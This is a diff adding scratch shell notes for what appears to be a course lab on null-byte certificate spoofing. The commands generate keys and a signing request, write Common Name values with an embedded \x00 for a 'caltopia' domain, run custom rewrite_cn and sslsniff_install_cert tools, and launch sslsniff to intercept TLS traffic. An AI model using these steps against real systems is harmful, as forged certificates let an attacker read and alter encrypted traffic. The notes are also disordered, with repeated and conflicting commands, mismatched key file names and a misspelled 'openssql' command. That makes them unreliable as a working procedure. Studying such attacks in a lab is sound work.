@@ -1,0 +1,47 @@
+
+
+openssl req -new -keyout data1_en.priv -out data1_cert.req
+openssl rsa -in data1_en.priv -out data1.priv
+CN = data.gov-of-caltopia\x00.info.neocal.info
+
+
+printf "data.gov-of-caltopia.info\x00.neocal.info" > input.dat
+
+./rewrite_cn data1_cert.req data1.priv input.dat data1.req
+
+./sslsniff_install_cert data1.x509 data1.priv
+./sslsniff
+
+
+
+
+
+
+
+
+
+echo -n "data.gov-of-caltopia.info\0something.neocal.info" > input.dat
+
+
+
+
+./sslsniff_install_cert data1.x509 data1_dec.priv
+
+
+./rewrite_cn data1.req data1_dec.priv input2.dat data2.req
+
+
+
+
+./rewrite_cn data1.req data1.priv input.dat data2.req
+
+printf "data.gov-of-caltopia.info\x5c\x30.neocal.info" > input.dat
+
+printf "data.gov-of-caltopia.info\x5c\x30.neocal.info" > input.dat
+data.gov-of-caltopia.info\0.neocal.info
+
+
+openssl genrsa -out data1.priv 2048
+openssl req -new -key data1-dec.priv -out data1.cert
+
+openssql rsa -in data1.priv -out data1-dec.priv
